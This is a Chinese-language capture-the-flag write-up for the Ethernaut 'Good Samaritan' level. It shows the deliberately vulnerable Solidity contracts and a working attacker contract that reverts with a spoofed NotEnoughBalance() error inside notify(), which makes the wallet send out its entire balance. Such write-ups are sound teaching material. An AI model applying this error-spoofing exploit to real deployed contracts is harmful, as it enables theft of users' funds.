# Ethernaut 27-Good Samaritan

## 本关目标

- 取走钱包中的所有余额

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    // 调用这个函数来请求coin, 一次只能收10个，钱包余额不足10个时转走所有余额
    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
          // 当请求返回异常为NotEnoughBalance()时转走所有余额
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    // coin转移实际操作函数
    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            // 只要转账目的方是合约，就会调用目的方合约中的notify方法
            if(dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // 取coin借助函数
    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

## 解决方案

1. 根据合约，取走所有余额的方法是交易返回 NotEnoughBalance()
2. 调用链：GoodSamaritan.requestDonation() --> Wallet.donate10() --> Coin.transfer() -->如果目标地址是合约，那么调用合约中的 notify 方法-->可以在该方法中 revert NotEnoughBalance()

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGood{
    function coin() external view returns(address);
    function wallet() external view returns(address);
    function requestDonation() external returns(bool enoughBalance);
}

interface ICoin{
    function balances(address) external view returns(uint256);
}

contract Hack {
    IGood private good;
    error NotEnoughBalance();

    constructor (address target) {
        good = IGood(target);
    }

    function hack() external {
        good.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        }

    }
}
```
